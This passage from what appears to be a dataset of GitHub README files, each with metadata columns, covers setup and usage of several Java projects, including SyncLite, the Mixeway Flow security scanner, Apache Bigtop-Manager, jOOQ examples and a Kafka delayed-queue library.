# Running Integration Tests

```SyncLite Validator``` is a GUI based tool with a war file deployed on app server, it can be launched at http://localhost:8080/synclite-validator. A test job can be configured and run to execute all the end to end integration tests which validate data consolidation functionality for various SyncLite device types.  
    
	
# Pre-Built Releases:

## SyncLite Logger

1. SyncLite Logger is is published as maven dependency :
   ```
	<!-- https://mvnrepository.com/artifact/io.synclite/synclite-logger -->
	<dependency>
	    <groupId>io.synclite</groupId>
	    <artifactId>synclite-logger</artifactId>
	    <version>#LatestVersion#</version>
	</dependency>
   ```
2. OR You can directly download the latest published synclite-logger-<version>.jar from : https://github.com/syncliteio/SyncLiteLoggerJava/blob/main/src/main/resources/ and add it as a dependency in your applications.
   
## SyncLite Consolidator

1. A docker image of SyncLite Consolidator is available on docker hub : https://hub.docker.com/r/syncliteio/synclite-consolidator

2. OR a release zip file can be downloaded from this GitHub Repo : https://github.com/syncliteio/SyncLite/releases

# Supported Systems

## Source Systems
1. Edge Applications(Java/Python) +  SyncLite Logger (wrapping embedded databases :SQLite, DuckDB, Apache Derby, H2, HyperSQL)
2. Edge Applications (any programming language) + SyncLite DB (wrapping embedded databases :SQLite, DuckDB, Apache Derby, H2, HyperSQL)
3. Databases : PostgreSQL, MySQL, MongoDB, SQLite
4. Message Brokers : Eclipse Mosquitto MQTT broker
5. Data Files : CSV ( stored on FS/S3/MinIO)

## Staging Storages
1. Local FS
2. SFTP
3. S3
4. MinIO
5. Kafka
6. Microsoft OneDrive
7. Google Drive
   
## Destination Systems
1. PostgreSQL
2. MySQL
3. MongoDB
4. Microsoft SQL Server
5. Apache Iceberg
8. ClickHouse
9. FerretDB
6. SQLite
7. DuckDB

# Patent
SyncLite is backed by patented technlogy, more info : https://www.synclite.io/resources/patent  

# Support
Join <a href=https://join.slack.com/t/syncliteworkspace/shared_invite/zt-2pz945vva-uuKapsubC9Mu~uYDRKo6Jw>Slack Channel</a> for support and discussions.

Contact: support@synclite.io
",3,3,5,5.0,"['synclite', 'build', 'anything', 'sync', 'anywhere', 'build', 'application', 'build', 'streaming', 'application', 'for', 'last', 'mile', 'delivery', 'deploy', 'database', 'pipeline', 'setup', 'rapid', 'iot', 'data', 'connector', 'synclite', 'component', 'build', 'synclite', 'release', 'structure', 'quick', 'start', 'base', 'use', 'synclite', 'logger', 'configuration', 'file', 'application', 'code', 'sample', 'sql', 'api', 'transactional', 'device', 'java', 'python', 'appender', 'device', 'java', 'python', 'stream', 'device', 'java', 'python', 'application', 'code', 'sample', 'kafka', 'api', 'launch', 'use', 'synclite', 'db', 'run', 'integration', 'test', 'release', 'synclite', 'logger', 'synclite', 'consolidator', 'support', 'system', 'source', 'system', 'stag', 'storage', 'destination', 'system', 'patent', 'support']","['synclite', 'build', 'application', 'device', 'java']",1.0,[org.apache.maven.plugins:maven-assembly-plugin],0.0,0.0,1.0
Mixeway/Flow,main,"# Mixeway Flow

[![License](https://img.shields.io/badge/license-FlowLicense-blue.svg)](LICENSE.md)
![example workflow](https://github.com/mixeway/flow/actions/workflows/docker-build-backend.yml/badge.svg)
[![Discord](https://img.shields.io/discord/1272884200323944550)](https://discord.gg/76RY2Y82)
[![Contributions Welcome](https://img.shields.io/badge/contributions-welcome-brightgreen.svg)](CONTRIBUTING.md)

## Introduction
![Mixeway Flow](.github/img/logo.png ""logo"")

**Mixeway Flow** is a versatile and comprehensive tool designed to serve as the ultimate Swiss army knife for DevSecOps processes. It streamlines the integration of security practices into your development and operations workflows, ensuring that your software is secure from the ground up.

Mixeway Flow comes equipped with built-in open-source scanning engines that perform thorough security validations across multiple layers of your development stack. From Infrastructure as Code (IaC) to source code and open-source libraries, Mixeway Flow ensures that potential vulnerabilities are identified and addressed early in the development lifecycle.

One of Mixeway Flow's standout features is its seamless integration with Git and CI/CD environments through webhooks. This means you don't have to spend time configuring and maintaining complex CI/CD pipelinesâ€”Mixeway Flow automatically hooks into your existing workflows to provide continuous security monitoring.

All vulnerabilities detected by Mixeway Flow are displayed in a single, unified dashboard. This dashboard offers a comprehensive view of all potential threats, with the added ability to suppress or ignore certain vulnerabilities based on specific contexts or justifications. This flexibility allows you to focus on the most critical issues without being overwhelmed by false positives or low-priority alerts.

Whether you are a developer, a security engineer, or part of a DevOps team, Mixeway Flow simplifies the integration of security into your development process, helping you build and maintain secure software with ease.

## How Mixeway Flow works

![Mixeway Process](.github/img/flow_process.jpg)

1. Register Git repository by entering repo URL and access token. At moment of initialization initial scan on last commit on default branch will be performed.
2. Configure WebHook on the GitLab or GitHub instance that will be triggered every time push or pull/merge request is detected. This trigger will send information to FLow to run the scan on the selected branch / commit or queue it if there are many events
3. Wait for the results and review detected threats

## Vulnerabilities and threats detection
![Mixeway Threats](.github/img/flow_scans.png)

Mixeway Flow has built in tools that verify security of given application across many layers. Each scan is performed in a transparent way from the CICD or developer perspective.

### SAST - engine: Bearer (https://github.com/Bearer/bearer)
> **SAST (Static Application Security Testing)** is a security technique that analyzes source code, bytecode, or binary code for vulnerabilities without executing the program. It identifies security flaws at the code level early in the development process, allowing developers to fix issues before the code is deployed. SAST scans are essential for detecting common vulnerabilities like SQL injection, cross-site scripting (XSS), and insecure coding practices.

SAST scan is performed on the source code created and written by the team's developers looking for any places that might be a source for problems related with any type of injections or other threats.

**Scan requirements**: None. Scan is performed for every change without any conditions.

### SCA - engine: SBOM & OWASP Dependency Track (https://github.com/DependencyTrack/dependency-track)
> **SCA (Software Composition Analysis)** is a security practice that identifies and manages vulnerabilities in open-source and third-party components within a software project. By analyzing the software's dependencies, SCA tools detect known vulnerabilities, license compliance issues, and outdated libraries. This helps ensure that the software remains secure and compliant with industry standards, especially when using external code that may introduce risks into the project.

Integrating SCA scanning into Your software development lifecycle help You properly manage dependencies You introduce to the codebase.

**Scan requirements**: In order to trigger SCA engine there has to be `sbom.json` file located in the root of the repository

### IAC - engine: KICS (https://github.com/Checkmarx/kics)
> **IaC (Infrastructure as Code)** vulnerability scanning is a security practice that involves analyzing IaC templates and configurations for security risks before infrastructure is provisioned. By scanning these templates, such as Terraform or CloudFormation scripts, IaC vulnerability scanning tools detect misconfigurations, insecure settings, and potential vulnerabilities that could expose infrastructure to attacks. This proactive approach helps secure cloud environments and infrastructure by identifying issues early in the development process.

This type of scan verify `Dockerfiles`, `terraform`, `kubernetes deployments` and much more configurations that can be deployed looking for the misconfiguration or bad practices to be alerted.

**Scan requirements**: None. Scan is performed for every change without any conditions.

### Secret Leaks - engine: giteaks (https://github.com/gitleaks/gitleaks)
> **Secret leaks** refer to the unintentional exposure of sensitive information, such as API keys, passwords, tokens, and other credentials, in source code, configuration files, or logs. Detecting secret leaks is crucial, as exposed secrets can be exploited by attackers to gain unauthorized access to systems, services, or data. Secret scanning tools help identify and prevent the inclusion of sensitive information in public repositories or shared code, reducing the risk of security breaches.

Most severe incidents in the Public Cloud (but not only) occurred due to misconfigurations, hardcoded keys or keys accidentally pushed to the git repository. This kind of tests help You detect such problems and give You the timeframe needed to properly rotate leaked secrets.

**Scan requirements**: None. Scan is performed for every change without any conditions.

## Installation

- Prerequisites: access to docker hub, docker-compose command
- Hardware requirements: minimal 2CPU, 16GB ram 50GB disk space. Recommended: 4CPU, 32GB RAM 100 GB Disk space

### Option 1
```shell
git clone https://github.com/Mixeway/flow
cd flow
docker-compose up
```

### Option 2
```shell
cat <<EOF > docker-compose.yml
version: '3.8'

services:
  backend:
    image: mixeway/flow-api:latest
    container_name: flowapi_backend
    ports:
      - ""8888:8888""
      - ""8443:8443""
    environment:
      SSL: ""TRUE""
    volumes:
      - pki_data:/etc/pki
      - dependency_track_data:/root/.dependency-track
    depends_on:
      - flowdb

  flowdb:
    image: postgres:latest
    container_name: flowdb
    ports:
      - ""5432:5432""
    environment:
      POSTGRES_DB: flow
      POSTGRES_USER: flow_user
      POSTGRES_PASSWORD: flow_pass
    volumes:
      - flowdb_data:/var/lib/postgresql/data

  flow:
    image: mixeway/flow:latest
    container_name: flow_frontend
    ports:
      - ""443:443""
    volumes:
      - flow_data:/etc/nginx/ssl
    depends_on:
      - backend

volumes:
  flowdb_data:
  flow_data:
  pki_data:
  dependency_track_data:
EOF
docker-compose up
```

either way what will happen:
1. Postgres database will be set up
2. Backend will be set up, self-signed certificates will be generated, dependency track will be started
3. Frontend application will be started via nginx

application will be started at: `https://localhost:443`

initial password is: `admin:admin` - You will be forced to change it during first login

## Initial configuration

1. after login create a team
2. import the repository
3. register webhook
![webhook](.github/img/webhook.png)

Browse Detected vulnerabilities:
![webhook](.github/img/vulns.png)


## Documentation

> Under donstruction


## Roadmap

Features to be covered in the near future:
- SSO integration (OAuth, keycloak, gitlab login)
- BugTracking automated issues (gitlab issues, JIRA)
- Merge Request commenting with scanning results

Features to be covered in the further future:
- Integration with GitHub (the same scope as GitLab)
- Enhancing SCA engin with linking code repository with docker image in registry

---
",4,0,1,0.0,"['mixeway', 'flow', 'introduction', 'how', 'mixeway', 'flow', 'work', 'vulnerability', 'threat', 'detection', 'sast', 'engine', 'bearer', 'http', 'sca', 'engine', 'sbom', 'owasp', 'dependency', 'track', 'http', 'iac', 'engine', 'kics', 'http', 'secret', 'leak', 'engine', 'giteaks', 'http', 'installation', 'option', 'option', 'initial', 'configuration', 'documentation', 'roadmap']","['engine', 'http', 'mixeway', 'flow', 'option']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
C0de-cake/ecommerce-app,main,"# Ecommerce platform (fullstack project) Spring boot 3, Angular 18, Tailwind CSS, PostgreSQL, Kinde (2024)

Monorepo of the Ecommerce platform app.

[Video tutorial](https://youtu.be/4npG3sAMT5I)

### Key Features:
- ğŸ› ï¸ Admin panel for products and categories 
- ğŸ”âœ¨ Filter engine
- ğŸŒâš¡ Angular SSR 
- ğŸ’³ Stripe integration
- ğŸ¢ Hexagonal architecture (Backend)


## Usage
### Prerequisites
- [NodeJS 20.17 LTS](https://nodejs.org/dist/v20.17.0/node-v20.17.0.pkg)
- [Angular CLI v18](https://www.npmjs.com/package/@angular/cli)
- IDE ([VSCode](https://code.visualstudio.com/download), [IntelliJ](https://www.jetbrains.com/idea/download/))
- [JDK 21](https://adoptium.net/temurin/releases/)
- Docker ([Docker Desktop](https://docs.docker.com/engine/install/))

### Fetch dependencies
``npm install``

You will need to create an .env file at the root of the ecom-backend folder with the following values :

````
KINDE_CLIENT_ID=<client-id>
KINDE_CLIENT_SECRET=<client-secret>
STRIPE_API_KEY=<stripe-api-key>
STRIPE_WEBHOOK_SECRET=<stripe-webhook-secret>
````

## Manage the frontend

To run the dev server for your app, use:

```sh
npx nx serve ecom-frontend
```

To create a production bundle:

```sh
npx nx build ecom-frontend
```

To see all available targets to run for a project, run:

```sh
npx nx show project ecom-frontend
```

## Manage the Backend

To run the dev server for your app, use:

```sh
npx nx serve ecom-backend
```

To create a production bundle:

```sh
npx nx build ecom-backend
```

To see all available targets to run for a project, run:

```sh
npx nx show project ecom-backend
```
",0,0,1,0.0,"['ecommerce', 'platform', 'fullstack', 'project', 'spring', 'boot', 'angular', 'tailwind', 'cs', 'postgresql', 'kinde', 'key', 'feature', 'usage', 'prerequisite', 'fetch', 'dependency', 'manage', 'frontend', 'manage', 'backend']","['manage', 'ecommerce', 'platform', 'fullstack', 'project']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
apache/bigtop-manager,main,"<!---
   Licensed to the Apache Software Foundation (ASF) under one or more
   contributor license agreements.  See the NOTICE file distributed with
   this work for additional information regarding copyright ownership.
   The ASF licenses this file to You under the Apache License, Version 2.0
   (the ""License""); you may not use this file except in compliance with
   the License.  You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an ""AS IS"" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
--->


# Bigtop-Manager

Bigtop-Manager is a platform for managing Bigtop components. Inspired by Apache Ambari.

## Prerequisites

JDK: Requires JDK 17 or 21  
Metadata DB: Mariadb or Mysql(8 or above)

### API-DOCS
[swagger-ui](http://localhost:8080/swagger-ui/index.html)

### Compile
```bash
mvn clean package -DskipTests
```

### Developer
1. Create Database which named ""bigtop_manager"", Configure DB connect name & password, default both are 'root'
2. Run SQL DDL Script at `bigtop-manager-server/src/main/resources/ddl/MySQL-DDL-CREATE.sql`
3. Insert Test SQL Data at `dev-support/example/bigtop_manager/user.sql`
4. Start bigtop-manager-server `bigtop-manager-server/src/main/java/org/apache/bigtop/manager/server/ServerApplication.java`
5. Start bigtop-manager-agent `similiar with run bm-server`
6. Start bigtop-manager-ui `configure nodejs environmment, default folder is bigtop-manager-ui/node, then run with package.json`
7. Visit `http://localhost:5173/`, default login user & password are `""admin""`

### How to test a Service
> 1. Login
> 2. Create cluster ->Register host
> 3. Installation Services
> 4. Start Service
> 5. Stop Service

### API Testing
- request `http://localhost:8080/swagger-ui/index.html` to check swagger API Doc

### How to test bm-monitoring
1. Install [Prometheus LTS Version](https://github.com/prometheus/prometheus/releases/download/v2.45.3/prometheus-2.45.3.linux-amd64.tar.gz)
2. Configure prometheus.yml, add below code into `scrape_configs`
```
- job_name: ""bm-agent-host""
  metrics_path: ""/actuator/prometheus""
  static_configs:
    - targets: [""agent1 ip/hostname:8081"", ""agent2 ip/hostname:8081"", ...]
```
3. Configure Prometheus Query Info at `bigtop-manager-server/src/main/resources/application.yml`
```
monitoring:
  prometheus-host: ""http://localhost:9090""
  agent-host-job-name: ""bm-agent-host""
```",0,0,5,75.0,"['prerequisite', 'compile', 'developer', 'how', 'test', 'service', 'api', 'test', 'how', 'test']","['test', 'how', 'prerequisite', 'compile', 'developer']",18.0,"[com.diffplug.spotless:spotless-maven-plugin,com.github.eirslett:frontend-maven-plugin,org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-jar-plugin,org.codehaus.mojo:build-helper-maven-plugin,org.codehaus.mojo:flatten-maven-plugin,org.springframework.boot:spring-boot-maven-plugin,org.xolstice.maven.plugins:protobuf-maven-plugin]",0.0,15.0,3.0
vladmihalcea/high-performance-jooq,main,"# High-Performance jOOQ

The High-Performance jOOQ repository provides code examples that demonstrate how jOOQ works.

### Are you struggling with application performance issues?

<a href=""https://vladmihalcea.com/hypersistence-optimizer/?utm_source=GitHub&utm_medium=banner&utm_campaign=hpjp"">
<img src=""https://vladmihalcea.com/wp-content/uploads/2019/03/Hypersistence-Optimizer-300x250.jpg"" alt=""Hypersistence Optimizer"">
</a>

Imagine having a tool that can automatically detect if you are using JPA and Hibernate properly. No more performance issues, no more having to spend countless hours trying to figure out why your application is barely crawling.

Imagine discovering early during the development cycle that you are using suboptimal mappings and entity relationships or that you are missing performance-related settings. 

More, with Hypersistence Optimizer, you can detect all such issues during testing and make sure you don't deploy to production a change that will affect data access layer performance.

[Hypersistence Optimizer](https://vladmihalcea.com/hypersistence-optimizer/?utm_source=GitHub&utm_medium=banner&utm_campaign=hpjp) is the tool you've been long waiting for!

#### Training

If you are interested in on-site training, I can offer you my [High-Performance Java Persistence training](https://vladmihalcea.com/trainings/?utm_source=GitHub&utm_medium=banner&utm_campaign=hpjp)
which can be adapted to one, two or three days of sessions. For more details, check out [my website](https://vladmihalcea.com/trainings/?utm_source=GitHub&utm_medium=banner&utm_campaign=hpjp).

#### Consulting

If you want me to review your application and provide insight into how you can optimize it to run faster, 
then check out my [consulting page](https://vladmihalcea.com/consulting/?utm_source=GitHub&utm_medium=banner&utm_campaign=hpjp).

#### High-Performance Java Persistence Video Courses

If you want the fastest way to learn how to speed up a Java database application, then you should definitely enroll in [my High-Performance Java Persistence video courses](https://vladmihalcea.com/courses/?utm_source=GitHub&utm_medium=banner&utm_campaign=hpjp).

#### High-Performance Java Persistence Book

Or, if you prefer reading books, you are going to love my [High-Performance Java Persistence book](https://vladmihalcea.com/books/high-performance-java-persistence?utm_source=GitHub&utm_medium=banner&utm_campaign=hpjp) as well.

<a href=""https://vladmihalcea.com/books/high-performance-java-persistence?utm_source=GitHub&utm_medium=banner&utm_campaign=hpjp"">
<img src=""https://i0.wp.com/vladmihalcea.com/wp-content/uploads/2018/01/HPJP_h200.jpg"" alt=""High-Performance Java Persistence book"">
</a>

<a href=""https://vladmihalcea.com/courses?utm_source=GitHub&utm_medium=banner&utm_campaign=hpjp"">
<img src=""https://i0.wp.com/vladmihalcea.com/wp-content/uploads/2018/01/HPJP_Video_Vertical_h200.jpg"" alt=""High-Performance Java Persistence video course"">
</a>

## Java

All examples require at least Java 17 because of the awesome [Text Blocks](https://openjdk.java.net/jeps/355) feature, which makes JPQL and SQL queries so much readable.

## Maven

You need to use Maven 3.6.2 or newer to build the project.

## IntelliJ IDEA

On IntelliJ IDEA, the project runs just fine. You will have to make sure to select Java 17 or newer.

## Database setup

The project uses various database systems for integration testing, and you can configure the JDBC connection settings using the
`DatasourceProvider` instances (e.g., `PostgreSQLDataSourceProvider`).

### Manual Database configuration

- PostgreSQL

    You can install PostgreSQL, and the password for the `postgres` user should be `admin`.

    Now you need to create a `high_performance_java_persistence` database.
    
- Oracle

    You need to download and install Oracle XE

    Set the `sys` password to `admin`

    Connect to Oracle using the ""sys as sysdba"" user and create a new user:
    
        alter session set ""_ORACLE_SCRIPT""=true;

        create user oracle identified by admin default tablespace users;

        grant dba to oracle;

        alter system set processes=1000 scope=spfile;

        alter system set sessions=1000 scope=spfile;
        
        ALTER PROFILE DEFAULT LIMIT PASSWORD_LIFE_TIME UNLIMITED;

    Open the `C:\app\${user.name}\product\21c\homes\OraDB21Home1\network\admin` folder where `${user.name}` is your current Windows username.
  
    Locate the `tnsnames.ora` and `listener.ora` files and change the port from `1522` to `1521` if that's the case. If you made these modifications,
    you need to restart the `OracleOraDB21Home1TNSListener` and `OracleServiceXE` Windows services.
  
- MySQL

    You should install MySQL 8, and the password for the `mysql` user should be `admin`.

    Now, you need to create a `high_performance_java_persistence` schema

    Besides having all privileges on this schema, the `mysql` user also requires select permission on `mysql.PROC`.
    
    If you don't have a `mysql` user created at database installation time, you can create one as follows:
    
    ````
    CREATE USER 'mysql'@'localhost';
    
    SET PASSWORD for 'mysql'@'localhost'='admin';
    
    GRANT ALL PRIVILEGES ON high_performance_java_persistence.* TO 'mysql'@'localhost';
    
    GRANT SELECT ON mysql.* TO 'mysql'@'localhost';
    
    FLUSH PRIVILEGES;
    ````

- SQL Server

    You can install SQL Server Express Edition with Tools. Choose mixed mode authentication and set the `sa` user password to `adm1n`.

    Open SQL Server Configuration Manager -> SQL Server Network Configuration and enable Named Pipes and TCP
    
    In the right pane of the TCP/IP option, choose Properties, then IP Addresses and make sure you Enable all listed IP addresses.
    You need to blank the dynamic TCP port value and configure the static TCP port 1433 for all IPs.
        
    Open SQL Server Management Studio and create the `high_performance_java_persistence` database
    
## Maven

> To build the project, don't use *install* or *package*. Instead, just compile test classes like this:
>
>    mvn clean test-compile
    
Afterward, just pick one test from the IDE and run it individually.

> Don't you run all tests at once (e.g. `mvn clean test`) because the test suite will take a very long time to complete.
>
> So, run the test you are interested in individually.

Enjoy learning more about jOOQ and database systems!
",0,0,1,0.0,"['jooq', 'are', 'struggle', 'application', 'performance', 'issue', 'training', 'consult', 'java', 'persistence', 'video', 'course', 'java', 'persistence', 'book', 'java', 'maven', 'intellij', 'idea', 'database', 'setup', 'manual', 'database', 'configuration', 'maven']","['java', 'persistence', 'maven', 'database', 'jooq']",7.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:build-helper-maven-plugin,org.codehaus.mojo:sql-maven-plugin,org.jooq.pro:jooq-codegen-maven,org.jooq:jooq-codegen-maven]",0.0,6.0,1.0
aemisigna/hololiveid-kaela-event-public,main,"![Kaela's Event Logo](https://cdn.marow.dev/content/kaela_event_git_logo.png)

**Astonishingly KAEOTIC** is a Minecraft Event hosted by [Kaela Kovalskia](https://www.youtube.com/@KaelaKovalskia) and [hololive production](https://hololive.hololivepro.com/en).

[![Kaela's Tour](https://img.youtube.com/vi/n3BAPr9qGGQ/0.jpg)](https://www.youtube.com/watch?v=n3BAPr9qGGQ)

## ğŸ”¨ Technical details
- Server must use the [PaperMC](https://papermc.io) and [Nitori](https://github.com/Gensokyo-Reimagined/Nitori) software.
- It's recommended to use a proxy software like [Velocity](https://papermc.io/software/velocity) or [BungeeCord](https://www.spigotmc.org/wiki/bungeecord/).
- It's highly recommended to enable the server [resource pack](https://cdn.marow.dev/content/KaelaEventPack.zip), otherwise stuff might be a little weird.

## ğŸ”¨ Resource Pack
- Resource pack can be downloaded [here](https://cdn.marow.dev/content/KaelaEventPack.zip)
- Resources are on Minecraft version **1.21.1**.

## ğŸ”¨ Warning
- This server setup was made for [COVER Corporation](https://cover-corp.com/en/company) & [hololive production](https://hololive.hololivepro.com/en).
- The server is not made to be easy to install outside of the event host.
- This page is going to change by the time!

## ğŸ”¨ Acknowledgments
- [COVER Corporation](https://cover-corp.com/en/company) for once more, hosting awesome events!
- [Kaela Kovalskia](https://www.youtube.com/@KaelaKovalskia) for the opportunity!
- [Allan Castro](https://x.com/Allan_z8), for the server resource pack making.",1,0,1,0.0,"['technical', 'detail', 'resource', 'pack', 'warn', 'acknowledgment']","['technical', 'detail', 'resource', 'pack', 'warn']",1.0,"[ca.bkaw:paper-nms-maven-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-shade-plugin]",0.0,1.0,0.0
cashfree/kafka-delayed-queue,main,"# Kafka Delayed Queue for Spring and Java

Kafka Delayed Queue is a library that facilitates delayed message processing in Kafka, tailored for Spring applications. This library leverages Kafka topics and scheduled tasks to efficiently manage and process delayed messages, ensuring high-throughput and reliable message handling.

## Features

- **Seamless Integration:** Easily integrate with Spring applications.
- **Configurable Delays:** Set customizable delay intervals for message processing.
- **High Throughput:** Optimized for handling large volumes of messages.
- **Scalable and Reliable:** Built on a robust architecture for scalability and reliability.

## Prerequisites

- **Java:** Version 8 or higher.
- **Apache Kafka:** Version 2.0.0 or higher.
- **Spring Boot:** Version 2.0 or higher.

## Getting Started

### 1. Create Kafka Topics
Create Kafka topics based on the formula: `2 * log2(MaxDelay)`. Ensure these topics are available in your Kafka cluster.

```shell
#!/bin/bash

# Check if the correct number of arguments are provided
if [ ""$#"" -ne 3 ]; then
    echo ""Usage: $0 <kafka_bin_path> <prefix> <n>""
    exit 1
fi

# Assign the arguments to variables
KAFKA_BIN_PATH=$1
PREFIX=$2
N=$3

# Loop through 1 to n and create topics
for (( i=1; i<=N; i++ ))
do
    DELAY_QUEUE_TOPIC=""${PREFIX}.delay-queue.delay-level-${i}""
    BITCHECK_QUEUE_TOPIC=""${PREFIX}.delay-queue.bitcheck-level-${i}""

    # Create delay queue topic
    ""${KAFKA_BIN_PATH}/kafka-topics.sh"" --create --topic ""${DELAY_QUEUE_TOPIC}"" --bootstrap-server localhost:9092 --partitions 1 --replication-factor 1
    if [ $? -ne 0 ]; then
        echo ""Failed to create topic: ${DELAY_QUEUE_TOPIC}""
    else
        echo ""Successfully created topic: ${DELAY_QUEUE_TOPIC}""
    fi

    # Create bitcheck queue topic
    ""${KAFKA_BIN_PATH}/kafka-topics.sh"" --create --topic ""${BITCHECK_QUEUE_TOPIC}"" --bootstrap-server localhost:9092 --partitions 1 --replication-factor 1
    if [ $? -ne 0 ]; then
        echo ""Failed to create topic: ${BITCHECK_QUEUE_TOPIC}""
    else
        echo ""Successfully created topic: ${BITCHECK_QUEUE_TOPIC}""
    fi
done

```

```commandline
./create_delay_kafka_topics.sh /usr/local/kafka/bin xyz 5
```

### 2. Install the Library
Download and install the JAR file from the Kafka Delayed Queue releases.

### 3. Enable Delayed Kafka Queue
Annotate your main application class or configuration class with `@EnableDelayKafkaQueue` to enable the delayed queue functionality.

### 4. Configure Kafka
Create a BaseKafkaConfig bean in your configuration file. Configure the topic prefix, maximum delay, and destination topic and Other Resources.

```java
@EnableKafka
@EnableDelayKafkaQueue
@Configuration
public class KafkaConsumerConfig extends BaseKafkaConfiguration {

  private final String kafkaBrokers;
  private final int kafkaConcurrency;
  private final String consumerGroup;
  private final Boolean sslEnabled;
  private final String trustStoreLocation;
  private final String trustStorePassword;
  private final String keyPassword;
  private final String keyStorePassword;
  private final String keyStoreLocation;
 ....

  @Bean
  public BaseKafkaConfig library() {
    BaseKafkaConfig baseKafkaConfig = new BaseKafkaConfig();
    baseKafkaConfig.setKafkaBrokers(this.kafkaBrokers);
    baseKafkaConfig.setConsumerGroup(this.consumerGroup);
    baseKafkaConfig.setSslEnabled(Boolean.FALSE);
    baseKafkaConfig.setKeyPassword(this.keyPassword);
    baseKafkaConfig.setKeyStoreLocation(this.keyStoreLocation);
    baseKafkaConfig.setKeyStorePassword(trustStorePassword);
    baseKafkaConfig.setTrustStoreLocation(trustStoreLocation);
    baseKafkaConfig.setTrustStorePassword(trustStorePassword);
    baseKafkaConfig.setMaxDelay(1000L);
    baseKafkaConfig.setTopicPrefix(""xyz"");
    baseKafkaConfig.setDestinationTopic(""xyz.delay-queue.final"");
    return baseKafkaConfig;
  }
}
```

### 5. Start Pushing Messages
Use the kafkaTemplate bean to start pushing messages into the queue.

```java
@Service
public class MessageProducer {
    
    
    private final KafkaTemplate<String, String> kafkaTemplate;

    private final KafkaDelayUtil kafkaDelayUtil;

    @Autowired
    public MessageProducer(
            KafkaTemplate<String, String> kafkaTemplate, KafkaDelayUtil kafkaDelayUtil) {
        this.kafkaTemplate = kafkaTemplate;
        this.kafkaDelayUtil = kafkaDelayUtil;
    }

    public void sendMessage(String message, long delay) {
        KafkaDelayedQueueMessage kafkaMsg = new KafkaDelayedQueueMessage();
        kafkaMsg.setDelay(duration.toSeconds());
        kafkaMsg.setMessage(message);
        kafkaMsg.setStartTime(LocalDateTime.now());
        kafkaMsg.setPushTime(LocalDateTime.now());

        Long level = KafkaDelayUtil.fetchIntialLevel(duration.toSeconds());
        

        kafkaTemplate.send(
                kafkaDelayUtil.fetchTopicByLevel(level),
                ObjectMapperUtil.stringify(kafkaMsg, Boolean.TRUE));
        
    }
}

```


### 5. Start Listening Messages in the destination topic

```java
@Slf4j
@Component
public class KafkaReconWorker {

    @KafkaListener(
            topics = ""xyz.delay-queue.final"")
    public void listen(String message) {

        KafkaDelayedQueueMessage delayedQueueMsg =
                ObjectMapperUtil.readValue(message, KafkaDelayedQueueMessage.class, Boolean.FALSE);

        System.out.println(""Message Received :: "" + delayedQueueMsg.getMessage());
        ....
    }
}

```





",1,0,1,0.0,"['kafka', 'delayed', 'queue', 'spring', 'java', 'feature', 'prerequisite', 'get', 'start', 'create', 'kafka', 'topic', 'check', 'correct', 'number', 'argument', 'provide', 'assign', 'argument', 'variable', 'loop', 'n', 'create', 'topic', 'create', 'delay', 'queue', 'topic', 'create', 'bitcheck', 'queue', 'topic', 'install', 'library', 'enable', 'delayed', 'kafka', 'queue', 'configure', 'kafka', 'start', 'push', 'message', 'start', 'listen', 'message', 'destination', 'topic']","['topic', 'kafka', 'queue', 'create', 'start']",1.0,[com.diffplug.spotless:spotless-maven-plugin],0.0,1.0,0.0
wkorando/loominated-java,main,"# Loominated Java

The purpose of this project is to introduce and demonstrate the three central features of [Project Loom](https://openjdk.org/projects/loom/); [Virtual Threads](#virtual-threads), [Structured Concurrency](#structured-concurrency), and [Scoped Values](#scoped-values). Primarily the project is demonstrating using Structured Concurrency to break down an unit of work and execute it as concurrent tasks. 

You can view the accompanying presentation for this project here: https://wkorando.github.io/presentations/loominated-java/

## Virtual Threads

The central feature of Project Loom, virtual threads separate the concept of threads into two distinct parts. The Platform Thread, which is functionally similar to legacy Threads in, which have a one-to-one relationship to OS threads. And Virtual Threads, which exist in memory and run on top of platform threads. For a high-level overview of virtual threads, see this video: [https://www.youtube.com/watch?v=bOnIYy3Y5OA](https://www.youtube.com/watch?v=bOnIYy3Y5OA). For a more in-depth explanation on virtual threads be sure to read the [JEP 444](https://openjdk.org/jeps/444). 

## Structured Concurrency

Structured Concurrency, currently in preview as of JDK 23, is designed to allow developers to break a unit of work into multiple tasks that can be executed simultaneously. Structured concurrency introduces a new programming model to Java greatly simplifying the writing (and reading) of concurrent blocks of code, as well as error handling and debugging. Both of which will be covered in this project. 

## Scoped Values

With the introduction of virtual threads, and the possibility of tens of thousands, or more, concurrent threads being handled by a JVM, comes new issues. Historically in Java contextual information when Scoped Values were intended to 


https://openjdk.org/jeps/8338456

## About the Project

### Running the Project

This project is using the latest changes from the Loom EA builds, they are available for download here: [https://jdk.java.net/loom/](https://jdk.java.net/loom/)

### The ""Task""

The purpose of this project is to demonstrate running tasks concurrently, so isn't particularly concerned with the look of the task(s) being executed. The task, as designed, is simply wrapping a passed in value in a simple JSON message only to provide a thin veneer of similarity to real-world tasks. The task however is designed to be easily configurable in how long it takes to execute and/or if an error occurs during. 

```java
public static String task(String value, long executionTime, boolean throwException) {
	executionTime(executionTime);
	if (throwException) {
		throw new RuntimeException(String.format(""""""
				Task failed!
				value: %s
				executionTime: %d
				throwException: %b
				"""""", value, executionTime, throwException));
	}
	String result = String.format(""""""
			{
				""value"" : ""%s""
			}
			"""""", value);
	System.out.println(""Result of taks: "" + result);
	return result;
}
```

### Working with the Project

The project is divided in five steps, roughly representing ""maturity"" regarding concurrent concepts.

* [Step 1](#step-1-linear-programming) - Tasks are executed in serial, because the effort of writing the code concurrently was too difficult/not worth the effort.

* [Step 2](#step-2-concurrent-programming-pre-virtual-threads) - Tasks executed concurrently, but without using virtual threads. 

